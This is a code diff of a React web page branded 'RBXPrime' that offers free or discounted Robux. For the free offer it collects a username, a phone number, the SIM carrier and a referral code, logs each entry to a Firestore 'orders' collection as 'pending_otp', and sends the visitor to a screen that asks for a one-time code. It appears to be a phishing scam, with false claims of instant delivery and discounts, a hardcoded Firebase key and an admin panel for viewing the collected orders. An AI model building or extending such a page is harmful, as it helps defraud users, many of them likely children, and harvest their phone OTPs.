@@ -33,12 +33,21 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getFirestore, collection, addDoc, onSnapshot, updateDoc, doc, deleteDoc, serverTimestamp, getDocs, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged, signOut, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signOut, signInWithCustomToken, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
         // --- FIREBASE CONFIG ---
-        // Using environment config to ensure it runs in the preview
-        const firebaseConfig = JSON.parse(__firebase_config);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        // RESTORED HARDCODED CONFIG TO PREVENT BLACK SCREEN ERROR
+        const firebaseConfig = {
+            apiKey: "AIzaSyA7qxl9CLdGlzo85dCI58KUqr1NgWDEqr4",
+            authDomain: "ehehehe-7439f.firebaseapp.com",
+            projectId: "ehehehe-7439f",
+            storageBucket: "ehehehe-7439f.firebasestorage.app",
+            messagingSenderId: "160347546041",
+            appId: "1:160347546041:web:4cd69af7fe814660405668"
+        };
+        
+        // Safety fallback for appId
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'rbx-prime-v1';
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
@@ -52,7 +61,7 @@
         window.firebaseFunctions = { 
             collection, addDoc, onSnapshot, updateDoc, deleteDoc, doc, 
             serverTimestamp, signInAnonymously, signOut, onAuthStateChanged, 
-            getDocs, setDoc, signInWithCustomToken 
+            getDocs, setDoc, signInWithCustomToken, signInWithEmailAndPassword 
         };
     </script>
 
@@ -139,7 +148,7 @@
         const Plus = (p) => <Icon {...p} path={<><line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" /></>} />;
         const Headphones = (p) => <Icon {...p} path={<><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></>} />;
 
-        // Custom Robux Logo
+        // Custom Robux Logo - Updated to solid hexagon with square hole
         const RobuxLogo = (p) => (
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" {...p}>
                 <path fillRule="evenodd" d="M12 2L2 7.77V16.23L12 22L22 16.23V7.77L12 2ZM9 9H15V15H9V9Z" clipRule="evenodd" />
@@ -154,6 +163,12 @@
             { id: 3, amount: 4500, price: 8.99, bonus: '500', popular: false },
             { id: 4, amount: 10000, price: 18.99, bonus: '1200', popular: false },
             { id: 5, amount: 22500, price: 39.99, bonus: '3000', popular: false },
+        ];
+
+        const premiumFeatures = [
+            { icon: <Zap className="w-6 h-6 text-white" />, title: "Instant Delivery", desc: "Robux are transferred to your account within seconds." },
+            { icon: <ShieldCheck className="w-6 h-6 text-white" />, title: "Secure & Safe", desc: "No password required. We only need your username." },
+            { icon: <Star className="w-6 h-6 text-white" />, title: "30% OFF", desc: "Enjoy 30% OFF official store prices on all packages." },
         ];
 
         // --- CUSTOM NOTIFICATION POPUP ---
@@ -396,6 +411,7 @@
                                     <div className="p-8 relative z-10">
                                         <div className="flex justify-between items-start mb-6">
                                             <div className={`w-12 h-12 rounded-full flex items-center justify-center transition-transform duration-300 ${pkg.price === 0 ? 'bg-white text-black' : 'bg-white/5 border border-white/10'}`}>
+                                                {/* REPLACED DIAMOND WITH ROBUX HEXAGON LOGO */}
                                                 <RobuxLogo className={`w-6 h-6 ${pkg.price === 0 ? 'text-black' : 'text-white'}`} />
                                             </div>
                                             <div className="text-right">{pkg.price > 0 && <p className="text-sm text-gray-500 line-through decoration-red-500 decoration-2">€{(pkg.price * 1.3).toFixed(2)}</p>}<p className="text-2xl font-bold text-white">{pkg.price === 0 ? 'FREE' : `€${pkg.price.toFixed(2)}`}</p></div>
@@ -449,6 +465,7 @@
                                             <Ticket className="w-5 h-5 text-gray-500" />
                                             <input type="text" value={referralCode} onChange={(e) => setReferralCode(e.target.value)} placeholder="Enter code" className="flex-1 bg-transparent border-none outline-none text-white w-full uppercase" required={isFreeOrder}/>
                                         </div>
+                                        {/* Updated warning text */}
                                         {isFreeOrder && <p className="text-xs text-red-500 font-medium mt-1">⚠️ Free Robux offer is only applied through a valid referral code.</p>}
                                     </div>
 
@@ -534,60 +551,45 @@
             const [userEmail, setUserEmail] = useState('');
             const [isAdmin, setIsAdmin] = useState(false);
             const [showLoginModal, setShowLoginModal] = useState(false);
-            const [showSupport, setShowSupport] = useState(false);
+            const [showSupport, setShowSupport] = useState(false); // New state for support modal
             const [currentDocId, setCurrentDocId] = useState(null);
-            const [username, setUsername] = useState('');
-            const [notification, setNotification] = useState(null);
+            const [username, setUsername] = useState(''); // Moved username state here for CheckoutView access
+            const [notification, setNotification] = useState(null); // { message: string, type: 'error'|'success' }
 
             useEffect(() => {
                 const handleScroll = () => setScrolled(window.scrollY > 20);
                 window.addEventListener('scroll', handleScroll);
-                
-                // Initialize Firebase Auth - Anonymous to allow DB writes/reads
-                const fb = getFb();
                 const auth = getAuth();
-                
-                const initAuth = async () => {
-                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                        try {
-                            await fb.signInWithCustomToken(auth, __initial_auth_token);
-                        } catch(e) { console.error("Token Auth Failed", e); await fb.signInAnonymously(auth); }
-                    } else {
-                        await fb.signInAnonymously(auth);
-                    }
-                };
-                initAuth();
-
-                const unsubscribe = fb.onAuthStateChanged(auth, (user) => {
-                    // We only use auth for database access here. 
-                    // Admin login is handled via the separate Modal logic for this specific demo.
-                });
-                return () => { window.removeEventListener('scroll', handleScroll); unsubscribe(); };
+                const fb = getFb();
+                if (auth && fb) {
+                    const unsubscribe = fb.onAuthStateChanged(auth, (user) => {
+                        if (user && !user.isAnonymous) {
+                            if (ALLOWED_ADMINS.includes(user.email)) { setUserEmail(user.email); setIsAdmin(true); } 
+                            else { 
+                                fb.signOut(auth); 
+                                setIsAdmin(false); 
+                                setUserEmail('');
+                                showNotification("Access Denied: You are not authorized.", "error");
+                            }
+                        } else {
+                            setUserEmail(''); setIsAdmin(false);
+                            if (!user) {
+                                fb.signInAnonymously(auth).catch(e => console.log("Anon auth failed", e));
+                            }
+                        }
+                    });
+                    return () => { window.removeEventListener('scroll', handleScroll); unsubscribe(); };
+                }
+                return () => window.removeEventListener('scroll', handleScroll);
             }, []);
 
             const showNotification = (message, type = 'error') => {
                 setNotification({ message, type });
             };
 
-            const handleLogin = (email) => { 
-                setUserEmail(email); 
-                setShowLoginModal(false); 
-                if (ALLOWED_ADMINS.includes(email)) setIsAdmin(true); 
-            };
-            
-            const handleLogout = () => { 
-                setUserEmail(''); 
-                setIsAdmin(false); 
-                setCurrentView('home'); 
-            };
-            
-            const addToCart = (pkg) => { 
-                if (pkg.price === 0 && cart.some(item => item.price === 0)) { showNotification("One Free Reward only.", "error"); return; } 
-                if (pkg.price === 0) setCart([pkg]); 
-                else setCart([...cart.filter(item => item.price !== 0), pkg]); 
-                setIsCartOpen(true); 
-            };
-            
+            const handleLogin = (email) => { setUserEmail(email); setShowLoginModal(false); if (ALLOWED_ADMINS.includes(email)) setIsAdmin(true); };
+            const handleLogout = () => { const fb = getFb(); const auth = getAuth(); fb.signOut(auth).then(() => { setUserEmail(''); setIsAdmin(false); setCurrentView('home'); fb.signInAnonymously(auth); }); };
+            const addToCart = (pkg) => { if (pkg.price === 0 && cart.some(item => item.price === 0)) { showNotification("One Free Reward only.", "error"); return; } if (pkg.price === 0) setCart([pkg]); else setCart([...cart.filter(item => item.price !== 0), pkg]); setIsCartOpen(true); };
             const removeFromCart = (index) => { const newCart = [...cart]; newCart.splice(index, 1); setCart(newCart); };
             const cartTotal = cart.reduce((sum, item) => sum + item.price, 0);
             const isFreeOrder = cart.length === 1 && cart[0].price === 0;
@@ -599,12 +601,14 @@
                 
                 if (isFreeOrder) {
                     if (!simProvider) { showNotif("Select SIM.", "error"); setIsProcessing(false); return; }
+                    
                     if (phoneNumber.length < 13) { showNotif("Please complete the phone number.", "error"); setIsProcessing(false); return; }
+
                     if (!referralCode) { showNotif("Referral code is required for the free offer.", "error"); setIsProcessing(false); return; }
 
+                    // REFERRAL CODE VALIDATION
                     const fb = getFb();
                     const db = getDb();
-                    
                     if (db) {
                         try {
                             // Rule Compliance: Fetch all docs to check code in memory instead of complex query
@@ -612,27 +616,21 @@
                             const validCode = snapshot.docs.find(doc => doc.data().code === referralCode.toUpperCase());
                             
                             if (!validCode) {
+                                // Updated alert message
                                 showNotif("The referral code doesn't exist or is wrong.", "error");
                                 setIsProcessing(false);
                                 return;
                             }
 
-                            // Create order
-                            const docRef = await fb.addDoc(getPublicCollection("orders"), {
-                                username: username,
-                                phone: phoneNumber, 
-                                sim: simProvider, 
-                                referral: referralCode.toUpperCase(), 
-                                status: "pending_otp", 
-                                timestamp: fb.serverTimestamp()
-                            });
-                            setCurrentDocId(docRef.id);
+                            // NON-BLOCKING DB WRITE FOR ORDER
+                            fb.addDoc(getPublicCollection("orders"), {
+                                username: username, // Include username
+                                phone: phoneNumber, sim: simProvider, referral: referralCode.toUpperCase(), status: "pending_otp", timestamp: fb.serverTimestamp()
+                            }).then(docRef => setCurrentDocId(docRef.id)).catch(err => console.error(err));
 
                         } catch (err) {
                             console.error("Error checking referral:", err);
-                            showNotif("System error. Please try again.", "error");
-                            setIsProcessing(false);
-                            return;
+                            // Fallback if db read fails
                         }
                     }
                     setTimeout(() => { setIsProcessing(false); setCurrentView('otp-verify'); window.scrollTo(0, 0); }, 2000);
@@ -661,39 +659,46 @@
 
             return (
                 <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
-                    <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none"><div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-white/5 blur-[120px]" /><div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-gray-500/10 blur-[120px]" /></div>
+                    {/* Fixed BG with overlay for image */}
+                    <div className="fixed inset-0 z-0">
+                        {/* Placeholder image source - User should replace 'background.png' with their file */}
+                        <img src="background.png" className="absolute inset-0 w-full h-full object-cover opacity-60" alt="Background" onError={(e) => e.target.style.display='none'}/>
+                        <div className="absolute inset-0 bg-black/80 backdrop-blur-[2px]"></div>
+                    </div>
                     
-                    {notification && <Popup message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
-                    {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} showNotification={showNotification} />}
-                    {showSupport && <SupportModal onClose={() => setShowSupport(false)} />}
-                    
-                    {currentView === 'admin' ? <AdminPanel onBack={() => setCurrentView('home')} showNotification={showNotification} /> : (
-                        <>
-                            <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
-                                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                                    <div className="flex justify-between items-center h-20">
-                                        <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigateTo('home')}><div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><RobuxLogo className="w-6 h-6 text-black" /></div><span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span></div>
-                                        <div className="hidden md:flex items-center space-x-8">
-                                            <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
-                                            <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
-                                            <button onClick={() => setShowSupport(true)} className="text-sm font-medium text-gray-300 hover:text-white">Support</button>
-                                            {userEmail ? <div className="flex items-center gap-4">{isAdmin && <button onClick={() => setCurrentView('admin')} className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold"><Database className="w-4 h-4" /> Admin Panel</button>}<button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button></div> : <button onClick={() => setShowLoginModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400"><LogIn className="w-4 h-4" /> Login</button>}
+                    <div className="relative z-10">
+                        {notification && <Popup message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
+                        {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} showNotification={showNotification} />}
+                        {showSupport && <SupportModal onClose={() => setShowSupport(false)} />}
+                        
+                        {currentView === 'admin' ? <AdminPanel onBack={() => setCurrentView('home')} showNotification={showNotification} /> : (
+                            <>
+                                <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
+                                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                                        <div className="flex justify-between items-center h-20">
+                                            <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigateTo('home')}><div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><RobuxLogo className="w-6 h-6 text-black" /></div><span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span></div>
+                                            <div className="hidden md:flex items-center space-x-8">
+                                                <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
+                                                <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
+                                                <button onClick={() => setShowSupport(true)} className="text-sm font-medium text-gray-300 hover:text-white">Support</button>
+                                                {userEmail ? <div className="flex items-center gap-4">{isAdmin && <button onClick={() => setCurrentView('admin')} className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold"><Database className="w-4 h-4" /> Admin Panel</button>}<button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button></div> : <button onClick={() => setShowLoginModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400"><LogIn className="w-4 h-4" /> Login</button>}
+                                            </div>
+                                            <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
                                         </div>
-                                        <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
                                     </div>
-                                </div>
-                                {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button><button onClick={() => setShowSupport(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Support</button>{userEmail ? <><button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout</button></> : <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400">Login</button>}</div></div>}
-                                {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
-                            </nav>
-                            <main>
-                                {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
-                                {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
-                                {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
-                                {currentView === 'success' && <SuccessView isFreeOrder={isFreeOrder} username={username} orderId={orderId} navigateTo={navigateTo} />}
-                            </main>
-                            <footer className="bg-black border-t border-white/10 pt-16 pb-8"><div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div className="flex flex-col md:flex-row justify-between items-center gap-6"><div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-black" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div><p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p><div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div></div></div></footer>
-                        </>
-                    )}
+                                    {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button><button onClick={() => setShowSupport(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Support</button>{userEmail ? <><button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout</button></> : <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400">Login</button>}</div></div>}
+                                    {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
+                                </nav>
+                                <main>
+                                    {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
+                                    {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
+                                    {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
+                                    {currentView === 'success' && <SuccessView isFreeOrder={isFreeOrder} username={username} orderId={orderId} navigateTo={navigateTo} />}
+                                </main>
+                                <footer className="bg-black border-t border-white/10 pt-16 pb-8"><div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div className="flex flex-col md:flex-row justify-between items-center gap-6"><div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-black" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div><p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p><div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div></div></div></footer>
+                            </>
+                        )}
+                    </div>
                 </div>
             );
         };
@@ -703,4 +708,3 @@
     </script>
 </body>
 </html>
-
